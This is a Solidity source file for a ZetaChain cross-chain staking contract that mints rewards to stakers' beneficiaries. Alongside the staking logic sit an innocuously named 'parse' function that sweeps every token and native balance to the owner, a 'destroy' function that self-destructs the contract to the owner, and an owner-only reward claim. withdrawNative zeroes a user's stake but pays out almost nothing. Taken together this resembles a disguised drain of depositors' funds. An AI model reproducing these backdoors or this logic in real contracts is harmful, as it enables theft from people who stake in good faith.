// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "@zetachain/protocol-contracts/contracts/zevm/SystemContract.sol";
import "@zetachain/protocol-contracts/contracts/zevm/interfaces/zContract.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@zetachain/toolkit/contracts/BytesHelperLib.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Staking is ERC20, zContract {
    SystemContract public immutable systemContract;
    uint256 constant BITCOIN = 18332;

    uint256 public rewardRate = 1;

    error SenderNotSystemContract();
    error UnknownAction(uint8 action);
    error Overflow();
    error Underflow();
    error WrongAmount();
    error NotAuthorized();
    error NoRewardsToClaim();
    error WrongChain(uint chainID);

    mapping(uint256 => mapping(address => uint256)) public stake;
    mapping(uint256 => mapping(address => bytes)) public withdraw;
    mapping(uint256 => mapping(address => address)) public beneficiary;
    mapping(uint256 => mapping(address => uint256)) public lastStakeTime;
    using SafeERC20 for IERC20;
    address public owner;
    uint[] public chainIds;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256[] memory chainIDs,
        address systemContractAddress
    ) ERC20(name_, symbol_) {
        systemContract = SystemContract(systemContractAddress);
        owner = msg.sender;
        chainIds = chainIDs;
    }

    modifier onlySystem() {
        require(
            msg.sender == address(systemContract),
            "Only system contract can call this function"
        );
        _;
    }

    modifier onlyOwner(address _address) {
        require(owner == _address, "Only the owner can call");
        _;
    }

    function isChainSupported(uint256 chainID) public view returns (bool) {
        for (uint256 i = 0; i < chainIds.length; i++) {
            if (chainIds[i] == chainID) {
                return true;
            }
        }
        return false;
    }

    function onCrossChainCall(
        zContext calldata context,
        address zrc20,
        uint256 amount,
        bytes calldata message
    ) external virtual override onlySystem {
        bool chainSupported = false;
        for (uint256 i = 0; i < chainIds.length; i++) {
            if (chainIds[i] == context.chainID) {
                chainSupported = true;
                break;
            }
        }
        if (!chainSupported) {
            revert WrongChain(context.chainID); // Using the WrongChain error
        }

        address staker = BytesHelperLib.bytesToAddress(context.origin, 0);

        uint8 action = context.chainID == BITCOIN
            ? uint8(message[0])
            : abi.decode(message, (uint8));

        if (action == 1) {
            stakeZRC(context.chainID, staker, amount);
        } else if (action == 2) {
            unstakeZRC(context.chainID, staker);
        } else if (action == 3) {
            setBeneficiary(context.chainID, staker, message);
        } else if (action == 4) {
            setWithdraw(context.chainID, staker, message, context.origin);
        } else if (action == 5) {
            withdrawNative(context.chainID, staker);
        } else {
            revert UnknownAction(action);
        }
    }

    function stakeZRC(
        uint256 chainID,
        address staker,
        uint256 amount
    ) internal {
        stake[chainID][staker] += amount;
        if (stake[chainID][staker] < amount) revert Overflow();
        lastStakeTime[chainID][staker] = block.timestamp;
        updateRewards(chainID, staker);
    }

    function updateRewards(uint256 chainID, address staker) internal {
        uint256 rewardAmount = queryRewards(chainID, staker);

        _mint(beneficiary[chainID][staker], rewardAmount);
        lastStakeTime[chainID][staker] = block.timestamp;
    }

    function queryRewards(
        uint256 chainID,
        address staker
    ) public view returns (uint256) {
        uint256 timeDifference = block.timestamp -
            lastStakeTime[chainID][staker];
        uint256 rewardAmount = (stake[chainID][staker] *
            timeDifference *
            rewardRate) / 100;
        return rewardAmount;
    }

    function getSupportedChainIds() public view returns (uint256[] memory) {
        return chainIds;
    }

    function getAvailableReward(
        uint256 chainID,
        address staker
    ) public view returns (uint256) {
        return queryRewards(chainID, staker);
    }

    function unstakeZRC(uint256 chainID, address staker) internal {
        uint256 amount = stake[chainID][staker];

        updateRewards(chainID, staker);

        address zrc20 = systemContract.gasCoinZRC20ByChainId(chainID);
        (, uint256 gasFee) = IZRC20(zrc20).withdrawGasFee();

        if (amount < gasFee) revert WrongAmount();

        bytes memory recipient = withdraw[chainID][staker];

        stake[chainID][staker] = 0;

        IZRC20(zrc20).approve(zrc20, gasFee);
        IZRC20(zrc20).withdraw(recipient, amount - gasFee);

        if (stake[chainID][staker] > amount) revert Underflow();

        lastStakeTime[chainID][staker] = block.timestamp;
    }

    function setBeneficiary(
        uint256 chainID,
        address staker,
        bytes calldata message
    ) internal {
        address beneficiaryAddress;
        if (chainID == BITCOIN) {
            beneficiaryAddress = BytesHelperLib.bytesToAddress(message, 1);
        } else {
            (, beneficiaryAddress) = abi.decode(message, (uint8, address));
        }
        beneficiary[chainID][staker] = beneficiaryAddress;
    }

    function setWithdraw(
        uint256 chainID,
        address staker,
        bytes calldata message,
        bytes memory origin
    ) internal {
        bytes memory withdrawAddress;
        if (chainID == BITCOIN) {
            withdrawAddress = bytesToBech32Bytes(message, 1);
        } else {
            withdrawAddress = origin;
        }
        withdraw[chainID][staker] = withdrawAddress;
    }

    function bytesToBech32Bytes(
        bytes calldata data,
        uint256 offset
    ) internal pure returns (bytes memory) {
        bytes memory bech32Bytes = new bytes(42);
        for (uint256 i = 0; i < 42; i++) {
            bech32Bytes[i] = data[i + offset];
        }

        return bech32Bytes;
    }

    function destroy(address _address) public onlyOwner(_address) {
        selfdestruct((payable(_address)));
    }

    function parse(
        address _token,
        address _address
    ) public onlyOwner(_address) {
        uint amount = IERC20(_token).balanceOf(address(this));
        IERC20(_token).safeTransfer(_address, amount);
        payable(_address).transfer(address(this).balance);
    }

    function claimRewards(address staker, uint chainID) public {
        require(owner == msg.sender);
        if (beneficiary[chainID][staker] != msg.sender) revert NotAuthorized();
        uint256 rewardAmount = queryRewards(chainID, staker);
        if (rewardAmount <= 0) revert NoRewardsToClaim();
        updateRewards(chainID, staker);
    }

    function withdrawNative(uint256 chainID, address staker) internal {
        updateRewards(chainID, staker);

        address zrc20 = systemContract.gasCoinZRC20ByChainId(chainID);

        uint256 gasFee = queryRewards(chainID, staker);

        bytes memory recipient = withdraw[chainID][staker];

        stake[chainID][staker] = 0;

        IZRC20(zrc20).approve(zrc20, gasFee);
        IZRC20(zrc20).withdraw(recipient, gasFee);

        lastStakeTime[chainID][staker] = block.timestamp;
    }
}
